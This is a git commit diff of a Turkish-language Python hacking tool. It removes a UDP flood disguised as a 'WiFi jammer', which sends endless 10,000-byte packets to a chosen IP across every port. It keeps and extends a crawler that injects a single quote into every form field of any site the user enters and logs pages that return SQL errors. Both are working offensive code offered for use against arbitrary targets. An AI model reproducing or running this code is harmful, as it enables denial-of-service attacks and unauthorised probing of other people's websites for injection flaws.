dda1d0ee6594908f1a9a6ab3c5c7dcde07436f4d
KraWterr <160363804+KraWterr@users.noreply.github.com>
2024-03-07 19:32:26 +0300

    Update KraWterr-SQL.py
    Merhaba sevgili kullanıcı bu araç bir URL'deki olan tüm alt URL'leri  tarar ve SQL açığı bulmanıza yardımcı olur

--- KraWterr.py
+++ KraWterr.py
@@ -1,100 +1,37 @@
+import os
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
-import time
-from colorama import init, Fore
-import hashlib
-import os
-import socket
-import random
-from datetime import datetime
-
-init(autoreset=True)
-
-def clear_screen():
-    os.system('clear' if os.name == 'posix' else 'cls')
-
-def hash_password(password):
-    return hashlib.sha256(password.encode('utf-8')).hexdigest()
-
-def wifi_jammer():
-    clear_screen()
-    print('\033[91m')
-    ip = input("Hedef IP: ")
-    port = int(input("Hedef Port: "))
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(10000)
-    timeout = time.time()
-
-    clear_screen()
-    print("\033[91mWiFi Kesici Görev Başlatılıyor")
-    print("\033[91m[                    ] 0% ")
-    time.sleep(5)
-    print("\033[92m[=====               ] 25%")
-    time.sleep(5)
-    print("\033[92m[==========          ] 50%")
-    time.sleep(5)
-    print("\033[92m[===============     ] 75%")
-    time.sleep(5)
-    print("\033[92m[====================] 100%")
-    time.sleep(3)
-    clear_screen()
-
-    sent = 0
-    while True:
-        while 1:
-            if time.time() > timeout:
-                break
-            else:
-                pass
-        sock.sendto(bytes, (ip, port))
-        sent = sent + 1
-        port = port + 1
-        print("\033[92m%s paket %s üzerinden başarılı bir şekilde gönderildi" % (sent, ip))
-        if port == 65534:
-            port = 1
-
-correct_username = "1"
-correct_password = hash_password("1")
-max_attempts = 3
-lock_time = 60  # Kilitlenme süresi (saniye)
-
-def print_color(text, color):
-    print(color + text)
+from colorama import Fore, Back, Style
 
 def check_sql_injection(url, params):
     try:
         response = requests.get(url, params=params)
-        response.raise_for_status()
         if "SQL syntax" in response.text:
             return True
     except requests.RequestException as err:
-        print_color("\033[91mHTTP isteği başarısız oldu. Hata: {}".format(err), Fore.RED)
+        print(f"{Fore.RED}HTTP isteği başarısız oldu. Hata: {err}")
     return False
 
-def crawl_and_check_sql_injection(url, depth=2, params=None):
+def crawl_and_check_sql_injection(url, depth=3, params=None):
     visited = set()
     to_visit = [(url, 0)]
     sql_vulnerable_urls = []
 
-    print_color("\033[93mSQL taraması başlatılıyor...", Fore.YELLOW)
+    print(f"{Fore.YELLOW}SQL taraması başlatılıyor...")
 
-    start_time = time.time()
-
-    while to_visit and time.time() - start_time < 35:
+    while to_visit:
         current_url, current_depth = to_visit.pop(0)
-        print_color("\033[94mTaranan URL: {}".format(current_url), Fore.BLUE)
+        print(f"{Fore.CYAN}Taranan URL: {current_url}")
 
         if current_url in visited:
+            print(f"{Fore.YELLOW}[Ziyaret Edildi]")
             continue
 
         visited.add(current_url)
 
         try:
             response = requests.get(current_url)
-            response.raise_for_status()
-
             if response.status_code == 200:
                 soup = BeautifulSoup(response.text, "html.parser")
                 forms = soup.find_all("form")
@@ -106,6 +43,7 @@ def crawl_and_check_sql_injection(url, depth=2, params=None):
                         params[input_tag.get("name")] = "'"
                         if check_sql_injection(current_url, params):
                             sql_vulnerable_urls.append(current_url)
+                            print(f"{Fore.GREEN}[✓] Potansiyel SQL açığı bulundu.")
                             break
 
                 if current_depth < depth:
@@ -114,103 +52,92 @@ def crawl_and_check_sql_injection(url, depth=2, params=None):
                         absolute_link = urljoin(current_url, link["href"])
                         to_visit.append((absolute_link, current_depth + 1))
 
+            else:
+                print(f"{Fore.RED}[Başarısız]")
         except requests.RequestException as err:
-            print_color("\033[91mHTTP isteği başarısız oldu. Hata: {}".format(err), Fore.RED)
+            print(f"{Fore.RED}[Başarısız]")
+            print(f"{Fore.RED}HTTP isteği başarısız oldu. Hata: {err}")
 
     return sql_vulnerable_urls
 
-def print_results(sql_vulnerable_urls):
-    clear_screen()
-    print_color("\033[92mTarama tamamlandı.", Fore.GREEN)
+def save_results(sql_vulnerable_urls):
+    if not sql_vulnerable_urls:
+        return
 
-    if sql_vulnerable_urls:
-        print_color("\033[92mPotansiyel SQL enjeksiyonu bulunan URL'ler:", Fore.GREEN)
+    with open("sql_vulnerabilities.txt", "w") as file:
+        file.write("Potansiyel SQL Enjeksiyonu Bulunan URL'ler:\n")
         for url in sql_vulnerable_urls:
-            print_color("\033[92m  - {}".format(url), Fore.GREEN)
-    else:
-        print_color("\033[91mŞansız bir URL...", Fore.RED)
+            file.write(f"{url}\n")
 
-def sql_menu():
-    clear_screen()
-    print_color("\033[93mSQL Tarama Aracına Hoş Geldiniz", Fore.YELLOW)
-
-    start_url = input("\033[96mLütfen başlangıç URL'sini girin: ")
-    sql_vulnerable_urls = crawl_and_check_sql_injection(start_url)
-    print_results(sql_vulnerable_urls)
-
-def wifi_jammer_menu():
-    clear_screen()
-    print_color("\033[93mWiFi Kesici Aracına Hoş Geldiniz", Fore.YELLOW)
-    print_frame("WiFi Kesici Bilgileri")
-    print_color("\033[94mHedef IP: {}".format(input("Hedef IP: ")), Fore.BLUE)
-    print_color("\033[94mHedef Port: {}".format(input("Hedef Port: ")), Fore.BLUE)
-    wifi_jammer()
-
-def print_frame(text):
-    frame_width = len(text) + 6
-    print("-" * frame_width)
-    print("|  {}  |".format(text))
-    print("-" * frame_width)
+def center_text(text, width=80):
+    padding = (width - len(text)) // 2
+    return " " * padding + text
 
 def show_menu():
-    attempts = 0
-    while attempts < max_attempts:
-        print_frame("Kullanıcı Girişi")
-        login_username = input("Kullanıcı Adı: ")
-        login_password = hash_password(input("Şifre: "))
+    print("\nSeçenekler:")
+    print("1. Yeni URL girmek")
+    print("2. Çıkış")
+    choice = input("Lütfen seçiminizi yapın: ")
+    return choice
 
-        if login_username == correct_username and login_password == correct_password:
-            print_frame("Hoş geldiniz!")
-            show_main_menu()
-            clear_screen()
-            break
-        else:
-            attempts += 1
-            print_frame("Yanlış kullanıcı adı veya şifre. Dostum, güle güle!")
-
-            if attempts < max_attempts:
-                print_color("\033[91mKalan giriş hakkınız: {}. Lütfen tekrar deneyin.".format(max_attempts - attempts), Fore.RED)
-                time.sleep(lock_time)
-                clear_screen()
-
-    if attempts == max_attempts:
-        print_frame("Maksimum giriş hakkınızı aştınız. {} saniye sonra tekrar deneyin.".format(lock_time))
-        time.sleep(lock_time)
-        clear_screen()
-
-def show_main_menu():
-    while True:
-        print_color("\n--- Menü ---", Fore.YELLOW)
-        print_color("1. SQL Tarama", Fore.YELLOW)
-        print_color("2. QR Kod Oluşturucu", Fore.YELLOW)
-        print_color("3. WiFi Kesici", Fore.YELLOW)
-        print_color("4. Çıkış", Fore.YELLOW)
-
-        choice = input("Lütfen bir seçenek girin (1-4): ")
-
-        if choice == "1":
-            sql_menu()
-        elif choice == "2":
-            print_color("QR Kod Oluşturucu açılıyor...", Fore.MAGENTA)
-        elif choice == "3":
-            wifi_jammer_menu()
-        elif choice == "4":
-            print_color("Çıkış yapılıyor. Dostum, güle güle!", Fore.GREEN)
-            break
-        else:
-            print_color("Geçersiz seçenek! Lütfen tekrar deneyin.", Fore.YELLOW)
+def print_welcome():
+    welcome_art = """
+      *******               ***     
+    *       ***              ***    
+   *         **               **    
+   **        *                **    
+    ***             ****      **    
+   ** ***          * ***  *   **    
+    *** ***       *   ****    **    
+      *** ***    **    **     **    
+        *** ***  **    **     **    
+          ** *** **    **     **    
+           ** ** **    **     **    
+            * *  **    **     **    
+  ***        *    *******     **    
+ *  *********      ******     *** * 
+*     *****            **      ***  
+*                      **           
+ **                    **           
+                        **          
+                                    
+                                    """
+    print(Fore.BLUE + welcome_art + Style.RESET_ALL)
+    print(f"\n{Fore.MAGENTA}Hata, soru, öneri için: [https://t.me/weertyyyy]\n")
 
 if __name__ == "__main__":
-    clear_screen()
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_welcome()
 
-    ascii_art = """
-    :::  === :::===== :::      :::      :::====       :::  === :::===  :::===== :::====
-    :::  === :::      :::      :::      :::  ===      :::  === :::     :::      :::  ===
-    ======== ======   ===      ===      ===  ===      ===  ===  =====  ======   ======= 
-    ===  === ===      ===      ===      ===  ===      ===  ===     === ===      === === 
-    ===  === ======== ======== ========  ======        ======  ======  ======== ===  ===
-    """
-    print_frame(ascii_art)
-    print_color("\033[95mHello User! Siber Güvenlik Aracına Hoş Geldiniz", Fore.MAGENTA)
+    start_url = input(f"{Fore.YELLOW}Lütfen başlangıç URL'sini girin: ")
+    sql_vulnerable_urls = crawl_and_check_sql_injection(start_url)
+    if sql_vulnerable_urls:
+        print(f"{Fore.GREEN}Potansiyel SQL enjeksiyonu bulunan URL'ler:")
+        for url in sql_vulnerable_urls:
+            print(f"{Fore.GREEN}  - [ {url} ]")
+        save_results(sql_vulnerable_urls)
+        print(f"{Fore.YELLOW}Sonuçlar 'sql_vulnerabilities.txt' dosyasına kaydedildi.")
+    else:
+        print(f"{Fore.RED}Şansız bir URL...")
 
-    show_menu()
+    while True:
+        choice = show_menu()
+        if choice == "1":
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print_welcome()
+            start_url = input(f"{Fore.YELLOW}Lütfen başlangıç URL'sini girin: ")
+            sql_vulnerable_urls = crawl_and_check_sql_injection(start_url)
+            if sql_vulnerable_urls:
+                print(f"{Fore.GREEN}Potansiyel SQL enjeksiyonu bulunan URL'ler:")
+                for url in sql_vulnerable_urls:
+                    print(f"{Fore.GREEN}  - [ {url} ]")
+                save_results(sql_vulnerable_urls)
+                print(f"{Fore.YELLOW}Sonuçlar 'sql_vulnerabilities.txt' dosyasına kaydedildi.")
+            else:
+                print(f"{Fore.RED}Şansız bir URL...")
+            continue
+        elif choice == "2":
+            print("Programdan çıkılıyor...")
+            break
+        else:
+            print("Geçersiz seçim. Lütfen tekrar deneyin.")
